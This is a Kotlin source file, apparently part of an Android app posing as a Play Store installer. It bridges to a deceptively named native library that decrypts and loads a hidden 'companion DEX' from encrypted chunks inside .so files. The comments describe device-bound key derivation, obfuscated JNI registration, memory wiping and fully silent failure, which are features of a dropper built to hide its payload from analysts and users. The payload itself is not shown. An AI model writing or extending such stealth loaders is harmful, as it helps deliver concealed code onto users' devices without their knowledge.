package com.playstore.installer

import android.content.Context
import android.os.Build

/**
 * NativeProtect — Phase 4 Step 27+31
 *
 * Kotlin bridge to libnetwork_security_ext.so (the dedicated protection library).
 * Exposes a single entry point: loadCompanionDex().
 *
 * The native library handles all sensitive operations:
 *   - Chunk reading from .so files at XOR-unmasked offsets
 *   - HKDF key derivation using device identity
 *   - AES-256-GCM decryption
 *   - Dual integrity hash verification
 *   - DEX unpacking and ClassLoader creation
 *   - Secure memory wiping after use
 *
 * JNI method name is "nativeLoadDex" (obfuscated — registered via
 * RegisterNatives in JNI_OnLoad, not via static naming convention).
 */
internal object NativeProtect {

    init {
        try {
            System.loadLibrary("network_security_ext")
        } catch (e: UnsatisfiedLinkError) {
            // Native library not available — DexLoader will use Kotlin fallback
        }
    }

    /**
     * Load companion DEX from encrypted .so chunks via native engine.
     * Returns ClassLoader on success, null on any failure.
     * All failures are silent — no exceptions, no logs, no crashes.
     *
     * @param context       Application context (for ANDROID_ID + ClassLoader)
     * @param nativeLibDir  Path to native library directory (from applicationInfo)
     */
    fun loadCompanionDex(context: Context): ClassLoader? {
        return try {
            val nativeLibDir = context.applicationInfo.nativeLibraryDir
            val is64bit      = Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()
            nativeLoadDex(context, nativeLibDir, if (is64bit) 1 else 0)
        } catch (e: Throwable) {
            // UnsatisfiedLinkError, SecurityException, etc. → silent fail
            null
        }
    }

    /**
     * Native method — implemented in jni_bridge.c
     * Registered via RegisterNatives (no static naming).
     */
    @JvmStatic
    private external fun nativeLoadDex(
        context: Context,
        nativeLibDir: String,
        is64bit: Int
    ): ClassLoader?

    /**
     * Check if native library loaded successfully.
     */
    fun isAvailable(): Boolean {
        return try {
            // Simple check: try to access a known native symbol path
            val testLoad = NativeProtect::class.java.getDeclaredMethod(
                "nativeLoadDex",
                Context::class.java, String::class.java, Int::class.java
            )
            testLoad != null
        } catch (e: Exception) {
            false
        }
    }
}
